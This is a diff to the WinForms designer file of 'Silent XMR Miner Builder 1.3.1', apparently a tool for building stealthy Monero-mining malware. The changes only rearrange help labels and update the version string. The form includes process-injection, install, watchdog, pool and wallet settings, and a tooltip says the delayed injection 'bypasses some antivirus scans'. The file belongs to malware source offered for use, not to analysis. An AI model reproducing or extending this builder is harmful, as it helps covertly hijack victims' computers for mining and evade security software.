@@ -40,15 +40,12 @@ Partial Class Form1
         Me.helpLabelEnableCPU = New System.Windows.Forms.Label()
         Me.helpLabelMaxCPU = New System.Windows.Forms.Label()
         Me.Label28 = New System.Windows.Forms.Label()
-        Me.helpLabelWallet = New System.Windows.Forms.Label()
-        Me.Label36 = New System.Windows.Forms.Label()
-        Me.helpLabelInstall = New System.Windows.Forms.Label()
-        Me.Label15 = New System.Windows.Forms.Label()
         Me.MephForm1 = New SilentXMRMiner.MephTheme()
         Me.MephTabcontrol2 = New SilentXMRMiner.MephTabcontrol()
         Me.TabPage1 = New System.Windows.Forms.TabPage()
         Me.labelWiki = New System.Windows.Forms.LinkLabel()
         Me.Label10 = New System.Windows.Forms.Label()
+        Me.helpLabelWallet = New System.Windows.Forms.Label()
         Me.Label5 = New System.Windows.Forms.Label()
         Me.txtInjection = New SilentXMRMiner.MephComboBox()
         Me.Label8 = New System.Windows.Forms.Label()
@@ -58,8 +55,10 @@ Partial Class Form1
         Me.Label7 = New System.Windows.Forms.Label()
         Me.txtPoolPassowrd = New SilentXMRMiner.MephTextBox()
         Me.TabPage2 = New System.Windows.Forms.TabPage()
+        Me.Label36 = New System.Windows.Forms.Label()
         Me.Label37 = New System.Windows.Forms.Label()
         Me.toggleWatchdog = New SilentXMRMiner.MephToggleSwitch()
+        Me.helpLabelInstall = New System.Windows.Forms.Label()
         Me.chkInstall = New SilentXMRMiner.MephCheckBox()
         Me.txtInstallFileName = New SilentXMRMiner.MephTextBox()
         Me.Label2 = New System.Windows.Forms.Label()
@@ -96,6 +95,7 @@ Partial Class Form1
         Me.Label22 = New System.Windows.Forms.Label()
         Me.Label18 = New System.Windows.Forms.Label()
         Me.toggleSSLTLS = New SilentXMRMiner.MephToggleSwitch()
+        Me.Label15 = New System.Windows.Forms.Label()
         Me.Label13 = New System.Windows.Forms.Label()
         Me.toggleEnableCPU = New SilentXMRMiner.MephToggleSwitch()
         Me.Label12 = New System.Windows.Forms.Label()
@@ -330,54 +330,6 @@ Partial Class Form1
         Me.TooltipHelper.SetToolTip(Me.Label28, "The time to wait before injecting and starting the miner. This bypasses some anti" &
         "virus scans!")
         '
-        'helpLabelWallet
-        '
-        Me.helpLabelWallet.AutoSize = True
-        Me.helpLabelWallet.Cursor = System.Windows.Forms.Cursors.Help
-        Me.helpLabelWallet.Font = New System.Drawing.Font("Microsoft Sans Serif", 8.25!, System.Drawing.FontStyle.Underline)
-        Me.helpLabelWallet.ForeColor = System.Drawing.Color.Teal
-        Me.helpLabelWallet.Location = New System.Drawing.Point(136, 59)
-        Me.helpLabelWallet.Name = "helpLabelWallet"
-        Me.helpLabelWallet.Size = New System.Drawing.Size(13, 13)
-        Me.helpLabelWallet.TabIndex = 38
-        Me.helpLabelWallet.Text = "?"
-        '
-        'Label36
-        '
-        Me.Label36.AutoSize = True
-        Me.Label36.Cursor = System.Windows.Forms.Cursors.Help
-        Me.Label36.Font = New System.Drawing.Font("Microsoft Sans Serif", 8.25!, System.Drawing.FontStyle.Underline)
-        Me.Label36.ForeColor = System.Drawing.Color.Teal
-        Me.Label36.Location = New System.Drawing.Point(78, 113)
-        Me.Label36.Name = "Label36"
-        Me.Label36.Size = New System.Drawing.Size(13, 13)
-        Me.Label36.TabIndex = 46
-        Me.Label36.Text = "?"
-        '
-        'helpLabelInstall
-        '
-        Me.helpLabelInstall.AutoSize = True
-        Me.helpLabelInstall.Cursor = System.Windows.Forms.Cursors.Help
-        Me.helpLabelInstall.Font = New System.Drawing.Font("Microsoft Sans Serif", 8.25!, System.Drawing.FontStyle.Underline)
-        Me.helpLabelInstall.ForeColor = System.Drawing.Color.Teal
-        Me.helpLabelInstall.Location = New System.Drawing.Point(101, 16)
-        Me.helpLabelInstall.Name = "helpLabelInstall"
-        Me.helpLabelInstall.Size = New System.Drawing.Size(13, 13)
-        Me.helpLabelInstall.TabIndex = 38
-        Me.helpLabelInstall.Text = "?"
-        '
-        'Label15
-        '
-        Me.Label15.AutoSize = True
-        Me.Label15.Cursor = System.Windows.Forms.Cursors.Help
-        Me.Label15.Font = New System.Drawing.Font("Microsoft Sans Serif", 8.25!, System.Drawing.FontStyle.Underline)
-        Me.Label15.ForeColor = System.Drawing.Color.Teal
-        Me.Label15.Location = New System.Drawing.Point(82, 70)
-        Me.Label15.Name = "Label15"
-        Me.Label15.Size = New System.Drawing.Size(13, 13)
-        Me.Label15.TabIndex = 39
-        Me.Label15.Text = "?"
-        '
         'MephForm1
         '
         Me.MephForm1.AccentColor = System.Drawing.Color.FromArgb(CType(CType(255, Byte), Integer), CType(CType(128, Byte), Integer), CType(CType(0, Byte), Integer))
@@ -394,7 +346,7 @@ Partial Class Form1
         Me.MephForm1.Size = New System.Drawing.Size(535, 272)
         Me.MephForm1.SubHeader = "By Unam Sanctam, Credit to NYAN-x-CAT"
         Me.MephForm1.TabIndex = 0
-        Me.MephForm1.Text = "Silent XMR Miner Builder 1.3"
+        Me.MephForm1.Text = "Silent XMR Miner Builder 1.3.1"
         '
         'MephTabcontrol2
         '
@@ -459,6 +411,18 @@ Partial Class Form1
         Me.Label10.Size = New System.Drawing.Size(160, 17)
         Me.Label10.TabIndex = 41
         Me.Label10.Text = "For help please check the "
+        '
+        'helpLabelWallet
+        '
+        Me.helpLabelWallet.AutoSize = True
+        Me.helpLabelWallet.Cursor = System.Windows.Forms.Cursors.Help
+        Me.helpLabelWallet.Font = New System.Drawing.Font("Microsoft Sans Serif", 8.25!, System.Drawing.FontStyle.Underline)
+        Me.helpLabelWallet.ForeColor = System.Drawing.Color.Teal
+        Me.helpLabelWallet.Location = New System.Drawing.Point(136, 59)
+        Me.helpLabelWallet.Name = "helpLabelWallet"
+        Me.helpLabelWallet.Size = New System.Drawing.Size(13, 13)
+        Me.helpLabelWallet.TabIndex = 38
+        Me.helpLabelWallet.Text = "?"
         '
         'Label5
         '
@@ -583,6 +547,18 @@ Partial Class Form1
         Me.TabPage2.TabIndex = 1
         Me.TabPage2.Text = "Install"
         '
+        'Label36
+        '
+        Me.Label36.AutoSize = True
+        Me.Label36.Cursor = System.Windows.Forms.Cursors.Help
+        Me.Label36.Font = New System.Drawing.Font("Microsoft Sans Serif", 8.25!, System.Drawing.FontStyle.Underline)
+        Me.Label36.ForeColor = System.Drawing.Color.Teal
+        Me.Label36.Location = New System.Drawing.Point(78, 113)
+        Me.Label36.Name = "Label36"
+        Me.Label36.Size = New System.Drawing.Size(13, 13)
+        Me.Label36.TabIndex = 46
+        Me.Label36.Text = "?"
+        '
         'Label37
         '
         Me.Label37.AutoSize = True
@@ -605,6 +581,18 @@ Partial Class Form1
         Me.toggleWatchdog.Size = New System.Drawing.Size(50, 24)
         Me.toggleWatchdog.TabIndex = 44
         Me.toggleWatchdog.Text = "Enable GPU Mining"
+        '
+        'helpLabelInstall
+        '
+        Me.helpLabelInstall.AutoSize = True
+        Me.helpLabelInstall.Cursor = System.Windows.Forms.Cursors.Help
+        Me.helpLabelInstall.Font = New System.Drawing.Font("Microsoft Sans Serif", 8.25!, System.Drawing.FontStyle.Underline)
+        Me.helpLabelInstall.ForeColor = System.Drawing.Color.Teal
+        Me.helpLabelInstall.Location = New System.Drawing.Point(101, 16)
+        Me.helpLabelInstall.Name = "helpLabelInstall"
+        Me.helpLabelInstall.Size = New System.Drawing.Size(13, 13)
+        Me.helpLabelInstall.TabIndex = 38
+        Me.helpLabelInstall.Text = "?"
         '
         'chkInstall
         '
@@ -1147,6 +1135,18 @@ Partial Class Form1
         Me.toggleSSLTLS.Size = New System.Drawing.Size(50, 24)
         Me.toggleSSLTLS.TabIndex = 41
         Me.toggleSSLTLS.Text = "Enable SSL/TLS Connection"
+        '
+        'Label15
+        '
+        Me.Label15.AutoSize = True
+        Me.Label15.Cursor = System.Windows.Forms.Cursors.Help
+        Me.Label15.Font = New System.Drawing.Font("Microsoft Sans Serif", 8.25!, System.Drawing.FontStyle.Underline)
+        Me.Label15.ForeColor = System.Drawing.Color.Teal
+        Me.Label15.Location = New System.Drawing.Point(82, 70)
+        Me.Label15.Name = "Label15"
+        Me.Label15.Size = New System.Drawing.Size(13, 13)
+        Me.Label15.TabIndex = 39
+        Me.Label15.Text = "?"
         '
         'Label13
         '
